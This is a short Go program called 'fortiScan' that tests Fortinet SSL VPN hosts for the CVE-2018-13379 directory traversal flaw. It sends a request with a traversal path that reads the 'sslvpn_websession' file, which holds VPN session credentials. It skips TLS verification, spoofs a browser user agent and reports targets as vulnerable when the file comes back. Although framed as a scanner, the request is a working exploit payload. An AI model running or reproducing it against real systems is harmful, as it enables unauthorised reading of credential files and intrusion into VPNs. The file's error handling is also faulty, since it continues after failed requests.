// # FortiScan SSL VPN Directory Traversal Vulnerability (FG-IR-18-384) # //
// Bousselham Anas

package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"

	"github.com/common-nighthawk/go-figure"
)

var codername = "Anas Bousselham"
var ver = "0.5"
var eml = "anasoft@gmail.com"

func logo() {
	myFigure := figure.NewFigure("fortiScan", "", true)
	myFigure.Print()
	fmt.Println(codername)
	fmt.Println(eml)
	fmt.Println("Ver: ", ver)

}

func main() {
	logo()
	if len(os.Args) != 2 {
		fmt.Println("Usage: ", "Target:Port")
		return
	}
	cmd1 := os.Args[1]
	colorRed := "\033[31m"
	value := "var fgt_lang ="
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	httpClient := &http.Client{Transport: tr}
	req, err := http.NewRequest("GET", "https://"+cmd1+"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", nil)
	if err != nil {
		fmt.Println("Request error: ", err.Error())
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0")
	res, err := httpClient.Do(req)

	if err != nil {
		//          fmt.Println("Broken ", proxy)
		fmt.Println("Response error: ", err.Error())

	}
	defer res.Body.Close()
	if res.StatusCode != 200 {
		fmt.Println("The target is safe and is therefore not exploitable")

	}
	out, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println("Read error: ", err.Error())

	}
	matched, _ := regexp.MatchString(value, string(out))
	if matched {
		fmt.Println(string(colorRed), "Target is vulnerable    CVE-2018-13379, CVE-2018-13383, and CVE-2018-13382")
	}

}
